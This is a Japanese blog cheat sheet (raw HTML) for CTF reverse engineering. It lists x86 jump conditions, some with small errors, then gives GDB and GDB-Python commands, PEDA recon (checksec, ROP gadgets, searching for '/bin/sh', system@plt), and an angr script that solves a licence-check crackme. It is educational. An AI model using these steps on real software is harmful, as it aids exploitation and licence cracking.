JC	キャリーがある（CF <span class="token operator">=</span> <span class="token number">1</span>）
JCXZ	CXレジスタが0
JE	等しい<span class="token punctuation">(</span>ZF <span class="token operator">=</span> <span class="token number">1</span>）  <span class="token number">74</span>
JG	より大きい（ZF <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">&amp;</span> SF <span class="token operator">=</span> OF）
JGE	より大きいか等しい（SD <span class="token operator">=</span> OF）
JL	より小さい（SF <span class="token operator">!</span> OF）
JLE	より小さいか等しい（ZF <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">|</span> SF <span class="token operator">!</span> OF）
JNA	より上でない（CF <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">|</span> ZF <span class="token operator">=</span> <span class="token number">1</span>）
JNAE	より上でなく等しい（CF <span class="token operator">=</span> <span class="token number">1</span>）
JNB	より下でない（CF <span class="token operator">=</span> <span class="token number">0</span>）
JNBE	より下でなく等しい（CF <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">&amp;</span> ZF <span class="token operator">=</span> <span class="token number">0</span>）
JNC	キャリーがない（CF <span class="token operator">=</span> <span class="token number">0</span>）
JNE	等しくない<span class="token punctuation">(</span>ZF <span class="token operator">=</span> <span class="token number">0</span>） <span class="token number">75</span>
JNG	より大きくない（ZF <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">|</span> SF <span class="token operator">!</span> OF）
JNGE	より大きくなく等しくない（SF <span class="token operator">!</span> OF）
JNL	より小さくない（SF <span class="token operator">=</span> OF）
JNLE	より小さくなく等しくない<span class="token punctuation">(</span>ZF <span class="token operator">=</span> <span class="token number">0</span> <span class="token operator">&amp;</span> SF <span class="token operator">=</span> OF）
JNO	オーバーフローがない（OF <span class="token operator">=</span> <span class="token number">0</span>）
JNP	パリティがない（PF <span class="token operator">=</span> <span class="token number">0</span>）
JNS	符号がない（SF <span class="token operator">=</span> <span class="token number">0</span>）
JNZ	ゼロではない（ZF <span class="token operator">=</span> <span class="token number">0</span>）
JO	オーバーフローがある（PF <span class="token operator">=</span> <span class="token number">1</span>）
JP	パリティがある（PF <span class="token operator">=</span> <span class="token number">1</span>）
JPE	パリティが偶数<span class="token punctuation">(</span>PF <span class="token operator">=</span> <span class="token number">1</span>）
JPO	パリティが基数<span class="token punctuation">(</span>PF <span class="token operator">=</span> <span class="token number">0</span>）
JS	符合がある<span class="token punctuation">(</span>SF <span class="token operator">=</span> <span class="token number">1</span>）
JZ	ゼロである<span class="token punctuation">(</span>ZF <span class="token operator">=</span> <span class="token number">1</span>）

<span class="token punctuation">[</span>インラインアセンブラで学ぶアセンブリ言語 第3回 <span class="token punctuation">(</span><span class="token number">1</span>/3<span class="token punctuation">)</span>：CodeZine（コードジン）<span class="token punctuation">]</span><span class="token punctuation">(</span>https://codezine.jp/article/detail/485<span class="token punctuation">)</span></code></pre></div>
<h3 id="メモリ読み出しのよく使うやつ" style="position:relative;"><a href="#%E3%83%A1%E3%83%A2%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97%E3%81%AE%E3%82%88%E3%81%8F%E4%BD%BF%E3%81%86%E3%82%84%E3%81%A4" aria-label="メモリ読み出しのよく使うやつ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>メモリ読み出しのよく使うやつ</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">x/5i <span class="token variable">$rip</span>
x/5i <span class="token variable">$rbp</span>-0x1c
x /s
x /16
x/40c <span class="token variable">$rax</span>+<span class="token variable">$rdx</span>*1</code></pre></div>
<h3 id="レジストリ読み出し" style="position:relative;"><a href="#%E3%83%AC%E3%82%B8%E3%82%B9%E3%83%88%E3%83%AA%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97" aria-label="レジストリ読み出し permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>レジストリ読み出し</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">info registers eflags

xinfo register edx</code></pre></div>
<h3 id="変数読み出し" style="position:relative;"><a href="#%E5%A4%89%E6%95%B0%E8%AA%AD%E3%81%BF%E5%87%BA%E3%81%97" aria-label="変数読み出し permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>変数読み出し</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># 現在のフレームのローカル変巣</span>
info locals

<span class="token comment"># 特定の変数の値を出力</span>
p param

<span class="token comment"># 特定の変数の書き換え</span>
<span class="token builtin class-name">set</span> var param <span class="token operator">=</span> <span class="token string">"Hello world!"</span>
<span class="token builtin class-name">set</span> <span class="token punctuation">{</span>char<span class="token punctuation">}</span>0x5555555592a0 <span class="token operator">=</span> 0x20

<span class="token comment"># 現在のフレームの引数の一覧</span>
info args

<span class="token comment"># 特定の変数の変更の追跡</span>
display param
undisplay

<span class="token comment"># 特定の変数の変更時にブレーク</span>
<span class="token function">watch</span> param</code></pre></div>
<h3 id="実行時引数--標準入出力" style="position:relative;"><a href="#%E5%AE%9F%E8%A1%8C%E6%99%82%E5%BC%95%E6%95%B0--%E6%A8%99%E6%BA%96%E5%85%A5%E5%87%BA%E5%8A%9B" aria-label="実行時引数  標準入出力 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>実行時引数 / 標準入出力</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># 実行</span>
run

<span class="token comment"># コマンドライン引数付きで実行</span>
run arg1

<span class="token comment"># 標準入力(ファイルで指定可能)</span>
run <span class="token operator">&lt;</span> inputfile

<span class="token comment"># 標準出力(ファイルで指定可能)</span>
run <span class="token operator">></span> outputfile</code></pre></div>
<h3 id="gdbをpythonで操作する" style="position:relative;"><a href="#gdb%E3%82%92python%E3%81%A7%E6%93%8D%E4%BD%9C%E3%81%99%E3%82%8B" aria-label="gdbをpythonで操作する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>GDBをPythonで操作する</h3>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token comment"># gdb -x run.py</span>
<span class="token keyword">import</span> gdb
<span class="token keyword">from</span> pprint <span class="token keyword">import</span> pprint

<span class="token comment"># pprint(dir(gdb))</span>
BINDIR <span class="token operator">=</span> <span class="token string">"/home/kali/Downloads"</span>
BIN <span class="token operator">=</span> <span class="token string">"chall"</span>
INPUT <span class="token operator">=</span> <span class="token string">"./in.txt"</span>
OUT <span class="token operator">=</span> <span class="token string">"./out.txt"</span>
BREAK <span class="token operator">=</span> <span class="token string">"0x4a09f9"</span>

gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'file {}/{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>BINDIR<span class="token punctuation">,</span> BIN<span class="token punctuation">)</span><span class="token punctuation">)</span>
gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'b *{}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>BREAK<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 引数を変えてループ実行</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>INPUT<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"A"</span><span class="token operator">*</span>i<span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'run &lt; {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>INPUT<span class="token punctuation">,</span> OUT<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 特定のメモリアドレスの値の書き換え</span>
seed <span class="token operator">=</span> <span class="token string">"rgUAvvyfyApNPEYg"</span>
<span class="token keyword">for</span> i<span class="token punctuation">,</span> c <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>seed<span class="token punctuation">)</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token number">0x5555555592a0</span> <span class="token operator">+</span> i<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'set {}{} = {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"{char}"</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'set {}{} = {}'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token string">"{char}"</span><span class="token punctuation">,</span> target<span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    
<span class="token comment"># メモリの値をバイト形式で取得</span>
<span class="token comment"># https://doc.ecoscentric.com/gnutools/doc/gdb/Inferiors-In-Python.html</span>
i <span class="token operator">=</span> gdb<span class="token punctuation">.</span>inferiors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
mem <span class="token operator">=</span> i<span class="token punctuation">.</span>read_memory<span class="token punctuation">(</span><span class="token number">0x7fffffffdaa0</span><span class="token punctuation">,</span> <span class="token number">264</span><span class="token punctuation">)</span>
base <span class="token operator">=</span> mem<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>base<span class="token punctuation">)</span>

<span class="token comment"># register</span>
<span class="token comment"># https://sourceware.org/gdb/onlinedocs/gdb/Basic-Python.html</span>
reg <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gdb<span class="token punctuation">.</span>parse_and_eval<span class="token punctuation">(</span><span class="token string">"$rax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>reg<span class="token punctuation">)</span><span class="token punctuation">)</span>

h <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
i <span class="token operator">=</span> gdb<span class="token punctuation">.</span>inferiors<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
<span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    reg <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>gdb<span class="token punctuation">.</span>parse_and_eval<span class="token punctuation">(</span><span class="token string">"$rax"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    h<span class="token punctuation">.</span>append<span class="token punctuation">(</span>reg<span class="token punctuation">)</span>
    gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span>
<span class="token keyword">for</span> a <span class="token keyword">in</span> h<span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">"  "</span><span class="token punctuation">)</span>
    mem <span class="token operator">=</span> i<span class="token punctuation">.</span>read_memory<span class="token punctuation">(</span>a<span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>mem<span class="token punctuation">.</span>tobytes<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

gdb<span class="token punctuation">.</span>execute<span class="token punctuation">(</span><span class="token string">'quit'</span><span class="token punctuation">)</span></code></pre></div>
<h3 id="gdbでプロセスにアタッチワンライナー" style="position:relative;"><a href="#gdb%E3%81%A7%E3%83%97%E3%83%AD%E3%82%BB%E3%82%B9%E3%81%AB%E3%82%A2%E3%82%BF%E3%83%83%E3%83%81%E3%83%AF%E3%83%B3%E3%83%A9%E3%82%A4%E3%83%8A%E3%83%BC" aria-label="gdbでプロセスにアタッチワンライナー permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>GDBでプロセスにアタッチ(ワンライナー)</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token assign-left variable">p</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token function">ps</span> -ef <span class="token operator">|</span> <span class="token function">grep</span> -v <span class="token function">grep</span> <span class="token operator">|</span> <span class="token function">grep</span> myapp <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $2}'</span><span class="token variable">)</span></span><span class="token punctuation">;</span> gdb -p <span class="token variable">$p</span> -x gdbcmd.txt</code></pre></div>
<h3 id="pedaの機能を使う" style="position:relative;"><a href="#peda%E3%81%AE%E6%A9%9F%E8%83%BD%E3%82%92%E4%BD%BF%E3%81%86" aria-label="pedaの機能を使う permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>pedaの機能を使う</h3>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># アドレス検索</span>
$ searchmem 0x603890
$ searchmem <span class="token string">"/bin/sh"</span>

<span class="token comment"># checksec</span>
$ checksec

<span class="token comment"># ropgadget</span>
$ ropgadget
ret <span class="token operator">=</span> 0x401016
popret <span class="token operator">=</span> 0x401139
addesp_8 <span class="token operator">=</span> 0x401013

<span class="token comment"># plt</span>
$ plt
Breakpoint <span class="token number">5</span> at 0x401040 <span class="token punctuation">(</span>system@plt<span class="token punctuation">)</span></code></pre></div>
<h2 id="angrのサンプル" style="position:relative;"><a href="#angr%E3%81%AE%E3%82%B5%E3%83%B3%E3%83%97%E3%83%AB" aria-label="angrのサンプル permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>angrのサンプル</h2>
<div class="gatsby-highlight" data-language="python"><pre class="language-python"><code class="language-python"><span class="token keyword">import</span> angr
<span class="token keyword">import</span> monkeyhex
<span class="token keyword">import</span> pprint

proj <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">"licence.exe"</span><span class="token punctuation">,</span> auto_load_libs<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
pipenv shell
pip install angr
pip install monkeyhex
"""</span>

<span class="token comment">#######################################################</span>
<span class="token comment"># First</span>
<span class="token comment">#######################################################</span>
<span class="token triple-quoted-string string">"""
print("ARCH", proj.arch)
print("EntryPoint", proj.entry)
print("FileName", proj.filename)
"""</span>

<span class="token comment">#######################################################</span>
<span class="token comment"># Loader</span>
<span class="token comment">#######################################################</span>
<span class="token triple-quoted-string string">"""
print("Loader", proj.loader)
print("LoaderShareObj", proj.loader.shared_objects)
print("MinAddr", proj.loader.min_addr)
print("MaxAddr", proj.loader.max_addr)
print("ExeStack", proj.loader.main_object.execstack)
print("Pic", proj.loader.main_object.pic)
"""</span>

<span class="token comment">#######################################################</span>
<span class="token comment"># entry point</span>
<span class="token comment">#######################################################</span>
<span class="token triple-quoted-string string">"""
block = proj.factory.block(proj.entry)
print(block.pp())
print("Instructions", block.instructions)
print("Instruction Addrs", block.instruction_addrs)

print("Capstone", block.capstone)
print("Vex", block.vex)
"""</span>

<span class="token comment">#######################################################</span>
<span class="token comment"># Analyses</span>
<span class="token comment">#######################################################</span>
<span class="token triple-quoted-string string">"""
proj.analyses.BackwardSlice        proj.analyses.CongruencyCheck      proj.analyses.reload_analyses       
proj.analyses.BinaryOptimizer      proj.analyses.DDG                  proj.analyses.StaticHooker          
proj.analyses.BinDiff              proj.analyses.DFG                  proj.analyses.VariableRecovery      
proj.analyses.BoyScout             proj.analyses.Disassembly          proj.analyses.VariableRecoveryFast  
proj.analyses.CDG                  proj.analyses.GirlScout            proj.analyses.Veritesting           
proj.analyses.CFG                  proj.analyses.Identifier           proj.analyses.VFG                   
proj.analyses.CFGEmulated          proj.analyses.LoopFinder           proj.analyses.VSA_DDG               
proj.analyses.CFGFast              proj.analyses.Reassembler
"""</span>

cfg <span class="token operator">=</span> proj<span class="token punctuation">.</span>analyses<span class="token punctuation">.</span>CFGFast<span class="token punctuation">(</span><span class="token punctuation">)</span>
graph <span class="token operator">=</span> cfg<span class="token punctuation">.</span>graph
entry_node <span class="token operator">=</span> cfg<span class="token punctuation">.</span>get_any_node<span class="token punctuation">(</span>proj<span class="token punctuation">.</span>entry<span class="token punctuation">)</span>
<span class="token comment"># print("Graph Nodes", len(cfg.graph.nodes()))</span>
<span class="token comment"># print("Graph Entry Nodes", len(list(cfg.graph.successors(entry_node))))</span>

<span class="token comment">#######################################################</span>
<span class="token comment"># Main</span>
<span class="token comment">#######################################################</span>
obj <span class="token operator">=</span> proj<span class="token punctuation">.</span>loader<span class="token punctuation">.</span>main_object
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Entry"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>entry<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Min Addr"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>min_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Max Addr"</span><span class="token punctuation">,</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span>max_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

addr <span class="token operator">=</span> obj<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"strcmp"</span><span class="token punctuation">]</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"strcmp addr"</span><span class="token punctuation">,</span> addr<span class="token punctuation">)</span>

<span class="token comment"># print_good = 0x405e6d</span>
<span class="token comment"># avoid_addr = [0x405ceb, 0x405d2f, 0x405d62, 0x405d8f, 0x405dc2, 0x405de8, 0x405e1e, 0x405e4b]</span>

<span class="token comment"># create project</span>
proj <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'licence.exe'</span><span class="token punctuation">)</span>

<span class="token comment"># initial_state at the entry point of the binary</span>
init_state <span class="token operator">=</span> proj<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span>args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'licence.exe'</span><span class="token punctuation">,</span> <span class="token string">'key.dat'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token comment"># create simulation</span>
simgr <span class="token operator">=</span> proj<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simgr<span class="token punctuation">(</span>init_state<span class="token punctuation">)</span>

simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x405e57</span><span class="token punctuation">)</span><span class="token punctuation">,</span> avoid<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">0x405e86</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> results <span class="token keyword">in</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>results<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre></div>
<p>参考：<a href="ctf-angr-bigginer">angrによるシンボリック実行でRev問を解いてみたまとめ【WaniCTF2021】 - かえるのひみつきち</a></p></div></div></div><div class="Post-module--post__footer--3WzWU"><div><p class="Meta-module--meta__date--29eD7">Published <!-- -->Jun 11, 2022</p></div><div class="Tags-module--tags--1L_ct"><ul class="Tags-module--tags__list--91FqN"><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/hack-the-box/">HackTheBox</a></li><li class="Tags-module--tags__list-item--1M30P"><a class="Tags-module--tags__list-item-link--3SL_8" href="/tag/cheet-sheet/">CheetSheet</a></li></ul></div><div class="Author-module--author--2Yefr"><p>リバースエンジニアになりたい趣味プログラマ。WinDbgとYARAが好き。HackTheBox ProHacker / AtCoder 緑 / 情報処理安全確保支援士資格 Microsoft Japanに所属してます。発言はすべて個人の見解。<a class="Author-module--author__bio-twitter--n-O9n" href="https://www.twitter.com/yuki_kashiwaba" rel="noopener noreferrer" target="_blank"><strong>かしわば</strong> on Twitter</a></p></div></div><div class="Post-module--post__comments--25y6I"></div></div></div></div><div id="gatsby-announcer" style="position:absolute;top:0;width:1px;height:1px;padding:0;overflow:hidden;clip:rect(0, 0, 0, 0);white-space:nowrap;border:0" aria-live="assertive" aria-atomic="true"></div></div><script id="gatsby-script-loader">/*<![CDATA[*/window.pagePath="/cheatsheet-main";/*]]>*/</script><script id="gatsby-chunk-mapping">/*<![CDATA[*/window.___chunkMapping={"polyfill":["/polyfill-299cfcade846097f4d4b.js"],"app":["/app-bcba0182970e9af19752.js"],"component---cache-caches-gatsby-plugin-offline-app-shell-js":["/component---cache-caches-gatsby-plugin-offline-app-shell-js-fd4fb51a6fac1c18bdde.js"],"component---src-templates-categories-list-template-js":["/component---src-templates-categories-list-template-js-2181ec47d28e5c35d3e9.js"],"component---src-templates-category-template-js":["/component---src-templates-category-template-js-20a4b25c64f6d07e4601.js"],"component---src-templates-index-template-js":["/component---src-templates-index-template-js-6948e9aab014458e9632.js"],"component---src-templates-not-found-template-js":["/component---src-templates-not-found-template-js-7dcd968d0452a87a7325.js"],"component---src-templates-page-template-js":["/component---src-templates-page-template-js-e611ef8ea02ee8f2a104.js"],"component---src-templates-post-template-js":["/component---src-templates-post-template-js-381c1b847824134fa4bd.js"],"component---src-templates-tag-template-js":["/component---src-templates-tag-template-js-e7badf813ca678429ab6.js"],"component---src-templates-tags-list-template-js":["/component---src-templates-tags-list-template-js-2d7007993fc2bf0f9caf.js"]};/*]]>*/</script><script src="/polyfill-299cfcade846097f4d4b.js" nomodule=""></script><script src="/component---src-templates-post-template-js-381c1b847824134fa4bd.js" async=""></script><script src="/cd95ea5cbd2c605f26db819f07999610c9ff4310-9bf27003829f242941c6.js" async=""></script><script src="/styles-407fe62976dc5310c43e.js" async=""></script><script src="/app-bcba0182970e9af19752.js" async=""></script><script src="/dc6a8720040df98778fe970bf6c000a41750d3ae-7aaf3141ca615681a7e8.js" async=""></script><script src="/532a2f07-92db97c0addf07d5cb73.js" async=""></script><script src="/framework-3761df4ab6ee9f056936.js" async=""></script><script src="/webpack-runtime-11f296c1c87b7169988c.js" async=""></script></body></html>